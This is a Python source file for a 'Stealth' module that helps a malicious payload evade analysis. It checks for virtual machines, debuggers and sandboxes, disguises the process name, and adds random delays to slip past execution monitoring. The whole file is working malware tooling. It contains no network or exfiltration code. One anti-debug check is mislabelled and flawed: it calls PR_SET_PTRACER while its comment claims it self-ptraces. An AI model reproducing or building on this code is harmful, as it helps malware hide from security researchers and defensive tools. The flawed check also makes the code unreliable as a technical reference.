#!/usr/bin/env python3
"""
Stealth Module
Comprehensive evasion techniques for payload execution
"""

import os
import sys
import time
import random
import platform
import subprocess
import psutil


class Stealth:
    """Stealth and evasion module."""
    
    def __init__(self, skip_vm_checks=False):
        """
        Initialize stealth module.
        
        Args:
            skip_vm_checks: If True, skip VM detection checks (for testing)
        """
        self.checks_passed = True
        self.is_windows = platform.system() == 'Windows'
        self.skip_vm_checks = skip_vm_checks
        
    def _debug_print(self, message):
        """Print debug message only on Windows."""
        # Debug statements disabled
        pass
        
    def check_all(self):
        """
        Run all stealth checks.
        
        Returns:
            bool: True if all checks pass, False if evasion detected
        """
        check_names = []
        checks = []
        
        # Only add VM check if not skipped
        if not self.skip_vm_checks:
            check_names.append('VM')
            checks.append(self.check_vm())
        
        check_names.extend(['Debugger', 'Timing'])
        checks.extend([
            self.check_debugger(),
            self.check_timing(),
        ])
        
        # Report which checks passed/failed (Windows only)
        for name, result in zip(check_names, checks):
            if result:
                self._debug_print(f"[+] Stealth check '{name}' passed")
            else:
                self._debug_print(f"[!] Stealth check '{name}' FAILED")
        
        # If any check fails, exit
        if not all(checks):
            self.checks_passed = False
            return False
        
        return True
    
    def check_vm(self):
        """
        Check for virtual machine indicators.
        
        Returns:
            bool: True if VM not detected, False if VM detected
        """
        try:
            # Check MAC address prefixes
            vm_mac_prefixes = [
                '00:0c:29',  # VMware
                '00:50:56',  # VMware
                '00:05:69',  # VMware
                '08:00:27',  # VirtualBox
                '00:16:3e',  # Xen
                '00:1c:14',  # Microsoft Hyper-V
            ]
            
            # Get MAC addresses
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address.upper()
                        for prefix in vm_mac_prefixes:
                            if mac.startswith(prefix):
                                return False
            
            # Check system information
            system_info = platform.platform().lower()
            vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v', 'vbox']
            
            for indicator in vm_indicators:
                if indicator in system_info:
                    return False
            
            # Check for VM-specific processes
            vm_processes = ['vmware', 'vbox', 'qemu', 'vmtoolsd', 'vmwaretray']
            running_processes = [p.name().lower() for p in psutil.process_iter(['name'])]
            
            for vm_proc in vm_processes:
                if any(vm_proc in proc for proc in running_processes):
                    return False
            
            # Check CPU count (VMs often have few CPUs)
            cpu_count = psutil.cpu_count()
            if cpu_count < 2:
                # Could be VM, but not definitive
                pass
            
            # Check RAM (VMs often have limited RAM)
            ram = psutil.virtual_memory().total / (1024**3)  # GB
            if ram < 2:
                # Could be VM, but not definitive
                pass
            
            return True
            
        except Exception:
            # If check fails, assume safe (fail open)
            return True
    
    def check_debugger(self):
        """
        Check for debugger attachment.
        
        Returns:
            bool: True if debugger not detected, False if debugger detected
        """
        try:
            # Timing-based anti-debug
            start_time = time.time()
            time.sleep(0.01)
            elapsed = time.time() - start_time
            
            # If sleep took too long, might be under debugger
            if elapsed > 0.1:
                return False
            
            # Check for ptrace (Linux)
            if sys.platform == 'linux':
                try:
                    # Try to ptrace ourselves (will fail if already traced)
                    import ctypes
                    PR_SET_PTRACER = 0x59616d61
                    libc = ctypes.CDLL(None)
                    result = libc.prctl(PR_SET_PTRACER, 0, 0, 0, 0)
                    if result != 0:
                        return False
                except Exception:
                    pass
            
            # Check for common debugger processes
            debuggers = ['gdb', 'lldb', 'windbg', 'x64dbg', 'x32dbg', 'ida', 'ida64', 'ollydbg']
            running_processes = [p.name().lower() for p in psutil.process_iter(['name'])]
            
            for debugger in debuggers:
                if any(debugger in proc for proc in running_processes):
                    return False
            
            return True
            
        except Exception:
            # If check fails, assume safe
            return True
    
    def check_timing(self):
        """
        Check execution timing for sandbox detection.
        
        Returns:
            bool: True if timing is normal, False if suspicious
        """
        try:
            # Perform some computation
            start = time.time()
            _ = sum(range(100000))
            computation_time = time.time() - start
            
            # If computation was too fast, might be sandbox
            if computation_time < 0.001:
                return False
            
            # If computation was too slow, might be under analysis
            if computation_time > 1.0:
                return False
            
            return True
            
        except Exception:
            return True
    
    def masquerade_process(self, target_name="python3"):
        """
        Attempt to masquerade as a legitimate process.
        
        Args:
            target_name: Process name to masquerade as
            
        Returns:
            bool: True if successful (or not applicable), False otherwise
        """
        try:
            # On Linux, we can't easily rename the process, but we can
            # set the process title if setproctitle is available
            if sys.platform == 'linux':
                try:
                    import setproctitle
                    setproctitle.setproctitle(target_name)
                    return True
                except ImportError:
                    # setproctitle not available, skip
                    pass
            
            # On other platforms, this is harder
            # For now, just return True (not critical)
            return True
            
        except Exception:
            return True
    
    def add_delay(self, min_seconds=5, max_seconds=15):
        """
        Add random delay to evade immediate execution monitoring.
        
        Args:
            min_seconds: Minimum delay in seconds
            max_seconds: Maximum delay in seconds
        """
        delay = random.randint(min_seconds, max_seconds)
        time.sleep(delay)
    
    def randomize_timing(self):
        """
        Add small random delays to randomize execution patterns.
        """
        delay = random.uniform(0.1, 0.5)
        time.sleep(delay)

